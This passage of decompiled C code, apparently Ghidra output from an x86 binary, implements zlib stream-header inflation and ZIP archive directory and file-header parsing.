      FUN_0038c1f0();
      return 0;
    }
    FUN_0038c230();
  }
  return 0xfffffffc;
}



byte * FUN_0038c330(void)

{
  byte bVar1;
  undefined4 uVar2;
  undefined4 *puVar3;
  byte **in_EAX;
  uint uVar4;
  byte *pbVar5;
  
  if (((in_EAX != (byte **)0x0) && ((undefined4 *)in_EAX[7] != (undefined4 *)0x0)) &&
     (*in_EAX != (byte *)0x0)) {
    uVar2 = *(undefined4 *)in_EAX[7];
    pbVar5 = (byte *)0xfffffffb;
    do {
      switch(uVar2) {
      case 0:
        if (in_EAX[1] == (byte *)0x0) {
          return pbVar5;
        }
        in_EAX[2] = in_EAX[2] + 1;
        in_EAX[1] = in_EAX[1] + -1;
        bVar1 = **in_EAX;
        *(uint *)(in_EAX[7] + 4) = (uint)bVar1;
        *in_EAX = *in_EAX + 1;
        pbVar5 = (byte *)0x0;
        if ((bVar1 & 0xf) == 8) {
          puVar3 = (undefined4 *)in_EAX[7];
          uVar4 = ((uint)puVar3[1] >> 4) + 8;
          if (uVar4 < (uint)puVar3[4] || uVar4 == puVar3[4]) {
            *puVar3 = 1;
            goto switchD_0038c365_caseD_1;
          }
          *puVar3 = 0xd;
          in_EAX[6] = (byte *)"invalid window size";
          goto LAB_0038c563;
        }
        *(undefined4 *)in_EAX[7] = 0xd;
        in_EAX[6] = (byte *)"unknown compression method";
        *(undefined4 *)(in_EAX[7] + 4) = 5;
        break;
      case 1:
switchD_0038c365_caseD_1:
        if (in_EAX[1] == (byte *)0x0) {
          return pbVar5;
        }
        in_EAX[2] = in_EAX[2] + 1;
        puVar3 = (undefined4 *)in_EAX[7];
        in_EAX[1] = in_EAX[1] + -1;
        bVar1 = **in_EAX;
        *in_EAX = *in_EAX + 1;
        pbVar5 = (byte *)0x0;
        if ((puVar3[1] * 0x100 + (uint)bVar1) % 0x1f != 0) {
          *puVar3 = 0xd;
          in_EAX[6] = (byte *)"incorrect header check";
          goto LAB_0038c563;
        }
        if ((bVar1 & 0x20) == 0) {
          *puVar3 = 7;
          break;
        }
        *(undefined4 *)in_EAX[7] = 2;
      case 2:
        if (in_EAX[1] == (byte *)0x0) {
          return pbVar5;
        }
        in_EAX[2] = in_EAX[2] + 1;
        in_EAX[1] = in_EAX[1] + -1;
        *(uint *)(in_EAX[7] + 8) = (uint)**in_EAX << 0x18;
        pbVar5 = (byte *)0x0;
        *in_EAX = *in_EAX + 1;
        *(undefined4 *)in_EAX[7] = 3;
switchD_0038c365_caseD_3:
        if (in_EAX[1] != (byte *)0x0) {
          in_EAX[2] = in_EAX[2] + 1;
          in_EAX[1] = in_EAX[1] + -1;
          *(uint *)(in_EAX[7] + 8) = *(int *)(in_EAX[7] + 8) + (uint)**in_EAX * 0x10000;
          pbVar5 = (byte *)0x0;
          *in_EAX = *in_EAX + 1;
          *(undefined4 *)in_EAX[7] = 4;
switchD_0038c365_caseD_4:
          if (in_EAX[1] != (byte *)0x0) {
            in_EAX[2] = in_EAX[2] + 1;
            in_EAX[1] = in_EAX[1] + -1;
            *(uint *)(in_EAX[7] + 8) = *(int *)(in_EAX[7] + 8) + (uint)**in_EAX * 0x100;
            pbVar5 = (byte *)0x0;
            *in_EAX = *in_EAX + 1;
            *(undefined4 *)in_EAX[7] = 5;
switchD_0038c365_caseD_5:
            if (in_EAX[1] != (byte *)0x0) {
              in_EAX[2] = in_EAX[2] + 1;
              in_EAX[1] = in_EAX[1] + -1;
              *(uint *)(in_EAX[7] + 8) = *(int *)(in_EAX[7] + 8) + (uint)**in_EAX;
              *in_EAX = *in_EAX + 1;
              in_EAX[0xc] = *(byte **)((int)in_EAX[7] + 8);
              *(undefined4 *)in_EAX[7] = 6;
              return (byte *)0x2;
            }
          }
        }
        return pbVar5;
      case 3:
        goto switchD_0038c365_caseD_3;
      case 4:
        goto switchD_0038c365_caseD_4;
      case 5:
        goto switchD_0038c365_caseD_5;
      case 6:
        *(undefined4 *)in_EAX[7] = 0xd;
        in_EAX[6] = (byte *)"need dictionary";
        *(undefined4 *)(in_EAX[7] + 4) = 0;
        return (byte *)0xfffffffe;
      case 7:
        pbVar5 = (byte *)FUN_0038a9f0(*(void **)(in_EAX[7] + 0x14),pbVar5);
        if (pbVar5 == (byte *)0xfffffffd) {
          *(undefined4 *)in_EAX[7] = 0xd;
          *(undefined4 *)(in_EAX[7] + 4) = 0;
        }
        else {
          if (pbVar5 == (byte *)0x0) {
            return (byte *)0x0;
          }
          if (pbVar5 != (byte *)0x1) {
            return pbVar5;
          }
          pbVar5 = (byte *)0x0;
          FUN_0038a8e0();
          puVar3 = (undefined4 *)in_EAX[7];
          if (puVar3[3] == 0) {
            *puVar3 = 8;
            goto switchD_0038c365_caseD_8;
          }
          *puVar3 = 0xc;
        }
        break;
      case 8:
switchD_0038c365_caseD_8:
        if (in_EAX[1] == (byte *)0x0) {
          return pbVar5;
        }
        in_EAX[2] = in_EAX[2] + 1;
        in_EAX[1] = in_EAX[1] + -1;
        *(uint *)(in_EAX[7] + 8) = (uint)**in_EAX << 0x18;
        pbVar5 = (byte *)0x0;
        *in_EAX = *in_EAX + 1;
        *(undefined4 *)in_EAX[7] = 9;
      case 9:
        if (in_EAX[1] == (byte *)0x0) {
          return pbVar5;
        }
        in_EAX[2] = in_EAX[2] + 1;
        in_EAX[1] = in_EAX[1] + -1;
        *(uint *)(in_EAX[7] + 8) = *(int *)(in_EAX[7] + 8) + (uint)**in_EAX * 0x10000;
        pbVar5 = (byte *)0x0;
        *in_EAX = *in_EAX + 1;
        *(undefined4 *)in_EAX[7] = 10;
switchD_0038c365_caseD_a:
        if (in_EAX[1] == (byte *)0x0) {
          return pbVar5;
        }
        in_EAX[2] = in_EAX[2] + 1;
        in_EAX[1] = in_EAX[1] + -1;
        *(uint *)(in_EAX[7] + 8) = *(int *)(in_EAX[7] + 8) + (uint)**in_EAX * 0x100;
        pbVar5 = (byte *)0x0;
        *in_EAX = *in_EAX + 1;
        *(undefined4 *)in_EAX[7] = 0xb;
switchD_0038c365_caseD_b:
        if (in_EAX[1] == (byte *)0x0) {
          return pbVar5;
        }
        in_EAX[2] = in_EAX[2] + 1;
        in_EAX[1] = in_EAX[1] + -1;
        *(uint *)(in_EAX[7] + 8) = *(int *)(in_EAX[7] + 8) + (uint)**in_EAX;
        puVar3 = (undefined4 *)in_EAX[7];
        *in_EAX = *in_EAX + 1;
        if (puVar3[1] == puVar3[2]) {
          *(undefined4 *)in_EAX[7] = 0xc;
switchD_0038c365_caseD_c:
          return (byte *)0x1;
        }
        *puVar3 = 0xd;
        in_EAX[6] = (byte *)"incorrect data check";
LAB_0038c563:
        pbVar5 = (byte *)0x0;
        *(undefined4 *)(in_EAX[7] + 4) = 5;
        break;
      case 10:
        goto switchD_0038c365_caseD_a;
      case 0xb:
        goto switchD_0038c365_caseD_b;
      case 0xc:
        goto switchD_0038c365_caseD_c;
      case 0xd:
        return (byte *)0xfffffffd;
      default:
        goto switchD_0038c365_caseD_e;
      }
      uVar2 = *(undefined4 *)in_EAX[7];
    } while( true );
  }
switchD_0038c365_caseD_e:
  return (byte *)0xfffffffe;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

uint __cdecl FUN_0038c6d0(undefined4 *param_1,uint param_2)

{
  int iVar1;
  uint unaff_EBX;
  uint uVar2;
  char *unaff_EDI;
  
  uVar2 = unaff_EBX * param_2;
  if (*unaff_EDI != '\0') {
    iVar1 = (*_DAT_003d94dc)(*(undefined4 *)(unaff_EDI + 4),param_1,uVar2,&param_2,0);
    if (iVar1 == 0) {
      unaff_EDI[8] = '\x01';
    }
    return param_2 / unaff_EBX;
  }
  iVar1 = *(int *)(unaff_EDI + 0x1c);
  if (*(uint *)(unaff_EDI + 0x18) < iVar1 + uVar2) {
    uVar2 = *(uint *)(unaff_EDI + 0x18) - iVar1;
  }
  FUN_003aee70(param_1,(undefined4 *)(*(int *)(unaff_EDI + 0x14) + iVar1),uVar2);
  *(uint *)(unaff_EDI + 0x1c) = *(int *)(unaff_EDI + 0x1c) + uVar2;
  return uVar2 / unaff_EBX;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 __cdecl FUN_0038c740(uint *param_1)

{
  int iVar1;
  char *unaff_ESI;
  uint uVar2;
  uint local_c;
  byte local_5;
  
  uVar2 = 1;
  if (*unaff_ESI == '\0') {
    iVar1 = *(int *)(unaff_ESI + 0x1c);
    if (*(uint *)(unaff_ESI + 0x18) < iVar1 + 1U) {
      uVar2 = *(uint *)(unaff_ESI + 0x18) - iVar1;
    }
    FUN_003aee70((undefined4 *)&local_5,(undefined4 *)(*(int *)(unaff_ESI + 0x14) + iVar1),uVar2);
    *(uint *)(unaff_ESI + 0x1c) = *(int *)(unaff_ESI + 0x1c) + uVar2;
    local_c = uVar2;
  }
  else {
    iVar1 = (*_DAT_003d94dc)(*(undefined4 *)(unaff_ESI + 4),&local_5,1,&local_c,0);
    if (iVar1 == 0) {
      unaff_ESI[8] = '\x01';
    }
  }
  if (local_c == 1) {
    *param_1 = (uint)local_5;
  }
  else {
    if ((*unaff_ESI != '\0') && (unaff_ESI[8] != '\0')) {
      return 0xffffffff;
    }
  }
  return 0;
}



void FUN_0038c7d0(void)

{
  uint uVar1;
  int iVar2;
  int *unaff_EBX;
  uint local_8;
  
  iVar2 = FUN_0038c740(&local_8);
  uVar1 = local_8;
  if (iVar2 == 0) {
    iVar2 = FUN_0038c740(&local_8);
    if (iVar2 == 0) {
      *unaff_EBX = local_8 * 0x100 + uVar1;
      return;
    }
  }
  *unaff_EBX = 0;
  return;
}



void FUN_0038c820(void)

{
  uint uVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  int *unaff_EBX;
  uint local_8;
  
  iVar2 = FUN_0038c740(&local_8);
  uVar1 = local_8;
  if (iVar2 == 0) {
    iVar2 = FUN_0038c740(&local_8);
  }
  iVar4 = local_8 * 0x100;
  if (iVar2 == 0) {
    iVar2 = FUN_0038c740(&local_8);
  }
  iVar3 = local_8 * 0x10000;
  if (iVar2 == 0) {
    iVar2 = FUN_0038c740(&local_8);
    if (iVar2 == 0) {
      *unaff_EBX = local_8 * 0x1000000 + uVar1 + iVar4 + iVar3;
      return;
    }
  }
  *unaff_EBX = 0;
  return;
}



int __fastcall FUN_0038c8a0(int param_1)

{
  char cVar1;
  char *in_EAX;
  char cVar2;
  int iVar3;
  
  iVar3 = param_1 - (int)in_EAX;
  while( true ) {
    cVar1 = in_EAX[iVar3];
    cVar2 = *in_EAX;
    in_EAX = in_EAX + 1;
    if ((byte)(cVar1 + 0x9fU) < 0x1a) {
      cVar1 = cVar1 + -0x20;
    }
    if ((byte)(cVar2 + 0x9fU) < 0x1a) {
      cVar2 = cVar2 + -0x20;
    }
    if (cVar1 == '\0') {
      return -(uint)(cVar2 != '\0');
    }
    if (cVar2 == '\0') {
      return 1;
    }
    if (cVar1 < cVar2) break;
    if (cVar2 < cVar1) {
      return 1;
    }
  }
  return -1;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

int FUN_0038c8f0(void)

{
  int iVar1;
  int iVar2;
  uint uVar3;
  int iVar4;
  uint uVar5;
  uint uVar6;
  char *unaff_ESI;
  uint local_1c;
  int local_18;
  undefined4 *local_14;
  uint local_10;
  uint local_c;
  uint local_8;
  
  if (*unaff_ESI == '\0') {
    *(undefined4 *)(unaff_ESI + 0x1c) = *(undefined4 *)(unaff_ESI + 0x18);
  }
  else {
    if (unaff_ESI[1] == '\0') {
      return -1;
    }
    (*_DAT_003d93d0)(*(undefined4 *)(unaff_ESI + 4),0,0,2);
  }
  if (*unaff_ESI == '\0') {
    local_8 = *(uint *)(unaff_ESI + 0x1c);
  }
  else {
    if (unaff_ESI[1] == '\0') {
      local_8 = 0;
    }
    else {
      iVar2 = (*_DAT_003d93d0)(*(undefined4 *)(unaff_ESI + 4),0,0,1);
      local_8 = iVar2 - *(int *)(unaff_ESI + 0xc);
    }
  }
  uVar6 = local_8;
  local_c = 0xffff;
  if (local_8 < 0xffff) {
    local_c = local_8;
  }
  uVar5 = local_c;
  local_14 = (undefined4 *)_malloc(0x404);
  if (local_14 == (undefined4 *)0x0) {
    return -1;
  }
  local_18 = -1;
  uVar3 = 4;
  if (uVar5 < 5) {
LAB_0038ca9d:
    _free(local_14);
    return local_18;
  }
  do {
    local_10 = uVar5;
    if (uVar3 + 0x400 <= uVar5) {
      local_10 = uVar3 + 0x400;
    }
    iVar2 = uVar6 - local_10;
    uVar6 = uVar6 - iVar2;
    if (0x404 < uVar6) {
      uVar6 = 0x404;
    }
    if (*unaff_ESI == '\0') {
      *(int *)(unaff_ESI + 0x1c) = iVar2;
    }
    else {
      if (unaff_ESI[1] == '\0') goto LAB_0038ca9d;
      (*_DAT_003d93d0)(*(undefined4 *)(unaff_ESI + 4),*(int *)(unaff_ESI + 0xc) + iVar2,0,0);
    }
    if (*unaff_ESI == '\0') {
      iVar4 = *(int *)(unaff_ESI + 0x1c);
      uVar5 = uVar6;
      if (*(uint *)(unaff_ESI + 0x18) < iVar4 + uVar6) {
        uVar5 = *(uint *)(unaff_ESI + 0x18) - iVar4;
      }
      FUN_003aee70(local_14,(undefined4 *)(*(int *)(unaff_ESI + 0x14) + iVar4),uVar5);
      *(uint *)(unaff_ESI + 0x1c) = *(int *)(unaff_ESI + 0x1c) + uVar5;
    }
    else {
      iVar4 = (*_DAT_003d94dc)(*(undefined4 *)(unaff_ESI + 4),local_14,uVar6,&local_1c,0);
      uVar5 = local_1c;
      if (iVar4 == 0) {
        unaff_ESI[8] = '\x01';
      }
    }
    if (uVar5 / uVar6 != 1) goto LAB_0038ca9d;
    iVar4 = uVar6 - 3;
    do {
      iVar1 = iVar4;
      if (iVar1 < 0) goto LAB_0038ca8b;
      iVar4 = iVar1 + -1;
    } while ((((*(char *)(iVar4 + (int)local_14) != 'P') ||
              (*(char *)(iVar1 + (int)local_14) != 'K')) ||
             (*(char *)(iVar1 + 1 + (int)local_14) != '\x05')) ||
            (*(char *)(iVar1 + 2 + (int)local_14) != '\x06'));
    local_18 = iVar4 + iVar2;
LAB_0038ca8b:
    if ((local_18 != 0) || (uVar3 = local_10, uVar6 = local_8, uVar5 = local_c, local_c <= local_10)
       ) goto LAB_0038ca9d;
  } while( true );
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 * FUN_0038cac0(void)

{
  char *in_EAX;
  int iVar1;
  undefined4 *puVar2;
  undefined4 *puVar3;
  int iVar4;
  undefined4 *puVar5;
  undefined4 local_94;
  int local_90;
  int local_88;
  int local_78;
  int local_74;
  int local_70;
  undefined4 local_18;
  int local_14;
  int local_10;
  int local_c;
  int local_8;
  
  if (in_EAX == (char *)0x0) {
    return (undefined4 *)0x0;
  }
  iVar4 = 0;
  local_94 = 0;
  trim_string((undefined (*) [16])&local_90,0,0x7c);
  local_14 = FUN_0038c8f0();
  if (local_14 != -1) {
    if (*in_EAX == '\0') {
      *(int *)(in_EAX + 0x1c) = local_14;
    }
    else {
      if (in_EAX[1] == '\0') goto LAB_0038cb2d;
      (*_DAT_003d93d0)(*(undefined4 *)(in_EAX + 4),*(int *)(in_EAX + 0xc) + local_14,0,0);
    }
    iVar1 = FUN_0038c820();
    if (iVar1 == 0) goto LAB_0038cb30;
  }
LAB_0038cb2d:
  iVar4 = -1;
LAB_0038cb30:
  local_8 = 0;
  if ((iVar4 == 0) && (iVar1 = FUN_0038c7d0(), iVar1 != 0)) {
    iVar4 = -1;
  }
  local_10 = 0;
  if ((iVar4 == 0) && ((iVar1 = FUN_0038c7d0(), iVar1 != 0 || (iVar1 = FUN_0038c7d0(), iVar1 != 0)))
     ) {
    iVar4 = -1;
  }
  local_c = 0;
  if ((((((iVar4 == 0) && (iVar4 = FUN_0038c7d0(), iVar4 == 0)) && (local_c == local_90)) &&
       ((local_10 == 0 && (local_8 == 0)))) &&
      ((iVar4 = FUN_0038c820(), iVar4 == 0 &&
       ((iVar4 = FUN_0038c820(), iVar4 == 0 && (iVar4 = FUN_0038c7d0(), iVar4 == 0)))))) &&
     ((uint)(local_74 + local_70) <= (uint)(*(int *)(in_EAX + 0xc) + local_14))) {
    local_88 = ((*(int *)(in_EAX + 0xc) - local_74) - local_70) + local_14;
    local_78 = local_14;
    local_18 = 0;
    *(undefined4 *)(in_EAX + 0xc) = 0;
    puVar2 = (undefined4 *)_malloc(0x80);
    puVar3 = &local_94;
    puVar5 = puVar2;
    for (iVar4 = 0x20; iVar4 != 0; iVar4 = iVar4 + -1) {
      *puVar5 = *puVar3;
      puVar3 = puVar3 + 1;
      puVar5 = puVar5 + 1;
    }
    FUN_0038d060();
    return puVar2;
  }
  if (in_EAX[0x10] != '\0') {
    (*_DAT_003d93b8)(*(undefined4 *)(in_EAX + 4));
  }
  FUN_003aee4b(in_EAX);
  return (undefined4 *)0x0;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

int __cdecl FUN_0038cc60(int *param_1,uint *param_2,undefined4 *param_3,uint param_4)

{
  char *pcVar1;
  char **in_EAX;
  int iVar2;
  uint uVar3;
  int *piVar4;
  int local_5c [4];
  uint local_4c;
  uint local_3c;
  int local_38;
  int local_34;
  int local_30;
  int local_2c;
  int local_24;
  uint local_20;
  uint local_1c;
  uint local_18;
  int local_14;
  int local_10;
  uint local_c;
  int local_8;
  
  local_8 = 0;
  if (in_EAX == (char **)0x0) {
    return -0x66;
  }
  pcVar1 = *in_EAX;
  if (*pcVar1 == '\0') {
    *(char **)(pcVar1 + 0x1c) = in_EAX[5] + (int)in_EAX[3];
LAB_0038ccac:
    iVar2 = FUN_0038c820();
    if (iVar2 == 0) {
      if (local_c != 0x2014b50) {
        local_8 = -0x67;
      }
      goto LAB_0038ccd3;
    }
  }
  else {
    if (pcVar1[1] != '\0') {
      (*_DAT_003d93d0)(*(undefined4 *)(pcVar1 + 4),
                       in_EAX[5] + (int)in_EAX[3] + *(int *)(pcVar1 + 0xc),0,0);
      goto LAB_0038ccac;
    }
  }
  local_8 = -1;
LAB_0038ccd3:
  iVar2 = FUN_0038c740(&local_c);
  uVar3 = local_c;
  if ((iVar2 == 0) && (iVar2 = FUN_0038c740(&local_c), iVar2 == 0)) {
    local_5c[0] = local_c * 0x100 + uVar3;
  }
  else {
    local_5c[0] = 0;
    if (iVar2 != 0) {
      local_8 = -1;
    }
  }
  iVar2 = FUN_0038c740(&local_c);
  uVar3 = local_c;
  if ((iVar2 == 0) && (iVar2 = FUN_0038c740(&local_c), iVar2 == 0)) {
    local_5c[1] = local_c * 0x100 + uVar3;
  }
  else {
    local_5c[1] = 0;
    if (iVar2 != 0) {
      local_8 = -1;
    }
  }
  iVar2 = FUN_0038c740(&local_c);
  uVar3 = local_c;
  if ((iVar2 == 0) && (iVar2 = FUN_0038c740(&local_c), iVar2 == 0)) {
    local_5c[2] = local_c * 0x100 + uVar3;
  }
  else {
    local_5c[2] = 0;
    if (iVar2 != 0) {
      local_8 = -1;
    }
  }
  iVar2 = FUN_0038c740(&local_c);
  uVar3 = local_c;
  if ((iVar2 == 0) && (iVar2 = FUN_0038c740(&local_c), iVar2 == 0)) {
    local_5c[3] = local_c * 0x100 + uVar3;
  }
  else {
    local_5c[3] = 0;
    if (iVar2 != 0) {
      local_8 = -1;
    }
  }
  iVar2 = FUN_0038c820();
  if (iVar2 != 0) {
    local_8 = -1;
  }
  local_18 = local_4c >> 0x10 & 0x1f;
  local_10 = (local_4c >> 0x19) + 0x7bc;
  local_14 = (local_4c >> 0x15 & 0xf) - 1;
  local_1c = local_4c >> 0xb & 0x1f;
  local_20 = local_4c >> 5 & 0x3f;
  local_24 = (local_4c & 0x1f) * 2;
  iVar2 = FUN_0038c820();
  if (iVar2 != 0) {
    local_8 = -1;
  }
  iVar2 = FUN_0038c820();
  if (iVar2 != 0) {
    local_8 = -1;
  }
  iVar2 = FUN_0038c820();
  if (iVar2 != 0) {
    local_8 = -1;
  }
  iVar2 = FUN_0038c740(&local_c);
  local_3c = local_c;
  if ((iVar2 == 0) && (iVar2 = FUN_0038c740(&local_c), iVar2 == 0)) {
    local_3c = local_c * 0x100 + local_3c;
  }
  else {
    local_3c = 0;
    if (iVar2 != 0) {
      local_8 = -1;
    }
  }
  iVar2 = FUN_0038c740(&local_c);
  uVar3 = local_c;
  if ((iVar2 == 0) && (iVar2 = FUN_0038c740(&local_c), iVar2 == 0)) {
    local_38 = local_c * 0x100 + uVar3;
  }
  else {
    local_38 = 0;
    if (iVar2 != 0) {
      local_8 = -1;
    }
  }
  iVar2 = FUN_0038c740(&local_c);
  uVar3 = local_c;
  if ((iVar2 == 0) && (iVar2 = FUN_0038c740(&local_c), iVar2 == 0)) {
    local_34 = local_c * 0x100 + uVar3;
  }
  else {
    local_34 = 0;
    if (iVar2 != 0) {
      local_8 = -1;
    }
  }
  iVar2 = FUN_0038c740(&local_c);
  uVar3 = local_c;
  if ((iVar2 == 0) && (iVar2 = FUN_0038c740(&local_c), iVar2 == 0)) {
    local_30 = local_c * 0x100 + uVar3;
  }
  else {
    local_30 = 0;
    if (iVar2 != 0) {
      local_8 = -1;
    }
  }
  iVar2 = FUN_0038c740(&local_c);
  uVar3 = local_c;
  if ((iVar2 == 0) && (iVar2 = FUN_0038c740(&local_c), iVar2 == 0)) {
    local_2c = local_c * 0x100 + uVar3;
  }
  else {
    local_2c = 0;
    if (iVar2 != 0) {
      local_8 = -1;
    }
  }
  iVar2 = FUN_0038c820();
  if (iVar2 != 0) {
    local_8 = -1;
  }
  iVar2 = FUN_0038c820();
  if (iVar2 != 0) {
    return -1;
  }
  if (local_8 == 0) {
    if (param_3 != (undefined4 *)0x0) {
      if (local_3c < param_4) {
        *(undefined *)(local_3c + (int)param_3) = 0;
      }
      if (((local_3c != 0) && (param_4 != 0)) && (uVar3 = FUN_0038c6d0(param_3,1), uVar3 != 1)) {
        return -1;
      }
    }
    if (param_1 != (int *)0x0) {
      piVar4 = local_5c;
      for (iVar2 = 0x14; iVar2 != 0; iVar2 = iVar2 + -1) {
        *param_1 = *piVar4;
        piVar4 = piVar4 + 1;
        param_1 = param_1 + 1;
      }
    }
    if (param_2 != (uint *)0x0) {
      *param_2 = local_c;
    }
  }
  return local_8;
}



int FUN_0038d060(void)

{
  int iVar1;
  int unaff_ESI;
  
  if (unaff_ESI == 0) {
    return -0x66;
  }
  *(undefined4 *)(unaff_ESI + 0x14) = *(undefined4 *)(unaff_ESI + 0x24);
  *(undefined4 *)(unaff_ESI + 0x10) = 0;
  iVar1 = FUN_0038cc60((int *)(unaff_ESI + 0x28),(uint *)(unaff_ESI + 0x78),(undefined4 *)0x0,0);
  *(uint *)(unaff_ESI + 0x18) = (uint)(iVar1 == 0);
  return iVar1;
}



void __fastcall FUN_0038d0a0(int param_1,undefined4 param_2)

{
  undefined4 uVar1;
  undefined4 uVar2;
  size_t sVar3;
  int iVar4;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  undefined4 uVar5;
  int unaff_EBX;
  char *unaff_EDI;
  undefined in_stack_fffffee0;
  undefined4 local_114 [67];
  uint local_8;
  
  local_8 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  if ((param_1 == 0) || (sVar3 = _strlen(unaff_EDI), param_2 = extraout_EDX, 0xff < sVar3)) {
    terminate_if_debugger_present(local_8 ^ (uint)&stack0xfffffffc,param_2,in_stack_fffffee0);
    return;
  }
  if (*(int *)(param_1 + 0x18) == 0) {
    terminate_if_debugger_present(local_8 ^ (uint)&stack0xfffffffc,extraout_EDX,in_stack_fffffee0);
    return;
  }
  uVar1 = *(undefined4 *)(param_1 + 0x10);
  uVar2 = *(undefined4 *)(param_1 + 0x14);
  iVar4 = FUN_0038d060();
  while (iVar4 == 0) {
    FUN_0038cc60((int *)0x0,(uint *)0x0,local_114,0x100);
    if (unaff_EBX == 1) {
      iVar4 = _strcmp((char *)local_114,unaff_EDI);
      uVar5 = extraout_EDX_00;
    }
    else {
      iVar4 = FUN_0038c8a0((int)local_114);
      uVar5 = extraout_EDX_01;
    }
    if (iVar4 == 0) {
      terminate_if_debugger_present(local_8 ^ (uint)&stack0xfffffffc,uVar5,in_stack_fffffee0);
      return;
    }
    if ((*(int *)(param_1 + 0x18) == 0) ||
       (iVar4 = *(int *)(param_1 + 0x10) + 1, iVar4 == *(int *)(param_1 + 4))) break;
    *(int *)(param_1 + 0x14) =
         *(int *)(param_1 + 0x14) +
         *(int *)(param_1 + 0x50) + *(int *)(param_1 + 0x4c) + 0x2e + *(int *)(param_1 + 0x48);
    *(int *)(param_1 + 0x10) = iVar4;
    iVar4 = FUN_0038cc60((int *)(param_1 + 0x28),(uint *)(param_1 + 0x78),(undefined4 *)0x0,0);
    *(uint *)(param_1 + 0x18) = (uint)(iVar4 == 0);
  }
  *(undefined4 *)(param_1 + 0x10) = uVar1;
  *(undefined4 *)(param_1 + 0x14) = uVar2;
  terminate_if_debugger_present(local_8 ^ (uint)&stack0xfffffffc,uVar1,in_stack_fffffee0);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

int __cdecl FUN_0038d1f0(char **param_1,char **param_2,char **param_3)

{
  char cVar1;
  char *pcVar2;
  char *pcVar3;
  int iVar4;
  char *pcVar5;
  char **unaff_EDI;
  char *local_10;
  char *local_c;
  int local_8;
  
  *param_1 = (char *)0x0;
  pcVar5 = unaff_EDI[3];
  pcVar2 = unaff_EDI[0x1e];
  *param_2 = (char *)0x0;
  pcVar3 = *unaff_EDI;
  cVar1 = *pcVar3;
  local_8 = 0;
  *param_3 = (char *)0x0;
  if (cVar1 == '\0') {
    *(char **)(pcVar3 + 0x1c) = pcVar5 + (int)pcVar2;
  }
  else {
    if (pcVar3[1] == '\0') {
      return -1;
    }
    (*_DAT_003d93d0)(*(undefined4 *)(pcVar3 + 4),pcVar5 + (int)pcVar2 + *(int *)(pcVar3 + 0xc),0,0);
  }
  iVar4 = FUN_0038c820();
  if (iVar4 == 0) {
    if (local_10 != (char *)0x4034b50) {
      local_8 = -0x67;
    }
  }
  else {
    local_8 = -1;
  }
  iVar4 = FUN_0038c740((uint *)&local_10);
  if (iVar4 == 0) {
    iVar4 = FUN_0038c740((uint *)&local_10);
    if (iVar4 != 0) goto LAB_0038d296;
  }
  else {
LAB_0038d296:
    local_8 = -1;
  }
  iVar4 = FUN_0038c740((uint *)&local_10);
  pcVar5 = local_10;
  if (iVar4 == 0) {
    iVar4 = FUN_0038c740((uint *)&local_10);
    if (iVar4 != 0) goto LAB_0038d2cf;
    local_10 = pcVar5 + (int)local_10 * 0x100;
  }
  else {
LAB_0038d2cf:
    local_10 = (char *)0x0;
    if (iVar4 != 0) {
      local_8 = -1;
    }
  }
  iVar4 = FUN_0038c740((uint *)&local_c);
  pcVar5 = local_c;
  if (iVar4 == 0) {
    iVar4 = FUN_0038c740((uint *)&local_c);
    if (iVar4 != 0) goto LAB_0038d355;
    local_c = pcVar5 + (int)local_c * 0x100;
LAB_0038d311:
    if ((local_8 == 0) &&
       ((pcVar5 = unaff_EDI[0xd], local_c != pcVar5 ||
        ((pcVar5 != (char *)0x0 && (pcVar5 != &DAT_00000008)))))) {
      local_8 = -0x67;
    }
  }
  else {
LAB_0038d355:
    local_c = (char *)0x0;
    if (iVar4 == 0) goto LAB_0038d311;
    local_8 = -1;
  }
  iVar4 = FUN_0038c820();
  if (iVar4 != 0) {
    local_8 = -1;
  }
  iVar4 = FUN_0038c820();
  if (iVar4 == 0) {
    if (((local_8 == 0) && (local_c != unaff_EDI[0xf])) && (((uint)local_10 & 8) == 0)) {
      local_8 = -0x67;
    }
  }
  else {
    local_8 = -1;
  }
  iVar4 = FUN_0038c820();
  if (iVar4 == 0) {
    if (((local_8 == 0) && (local_c != unaff_EDI[0x10])) && (((uint)local_10 & 8) == 0)) {
      local_8 = -0x67;
    }
  }
  else {
    local_8 = -1;
  }
  iVar4 = FUN_0038c820();
  if (iVar4 == 0) {
    if (((local_8 == 0) && (local_c != unaff_EDI[0x11])) && (((uint)local_10 & 8) == 0)) {
      local_8 = -0x67;
    }
  }
  else {
    local_8 = -1;
  }
  iVar4 = FUN_0038c740((uint *)&local_10);
  local_c = local_10;
  if (iVar4 == 0) {
    iVar4 = FUN_0038c740((uint *)&local_10);
    if (iVar4 != 0) goto LAB_0038d459;
    pcVar5 = local_c + (int)local_10 * 0x100;
LAB_0038d40f:
    if ((local_8 == 0) && (pcVar5 != unaff_EDI[0x12])) {
      local_8 = -0x67;
    }
  }
  else {
LAB_0038d459:
    pcVar5 = (char *)0x0;
    if (iVar4 == 0) goto LAB_0038d40f;
    local_8 = -1;
  }
  *param_1 = *param_1 + (int)pcVar5;
  iVar4 = FUN_0038c740((uint *)&local_10);
  local_c = local_10;
  if (iVar4 == 0) {
    iVar4 = FUN_0038c740((uint *)&local_10);
    if (iVar4 == 0) {
      local_c = local_c + (int)local_10 * 0x100;
      goto LAB_0038d475;
    }
  }
  local_c = (char *)0x0;
  if (iVar4 != 0) {
    local_8 = -1;
  }
LAB_0038d475:
  *param_2 = unaff_EDI[0x1e] + 0x1e + (int)pcVar5;
  *param_3 = local_c;
  *param_1 = *param_1 + (int)local_c;
  return local_8;
}



undefined4 __cdecl FUN_0038d4a0(char *param_1)

{
  int iVar1;
  void **_Memory;
  void *pvVar2;
  void **ppvVar3;
  void **extraout_EDX;
  void **unaff_EBX;
  char *local_10;
  char *local_c;
  char *local_8;
  
  if ((unaff_EBX == (void **)0x0) || (unaff_EBX[6] == (void *)0x0)) {
    return 0xffffff9a;
  }
  if (unaff_EBX[0x1f] != (void *)0x0) {
    FUN_0038d870();
  }
  iVar1 = FUN_0038d1f0(&local_10,&local_8,&local_c);
  if (iVar1 != 0) {
    return 0xffffff99;
  }
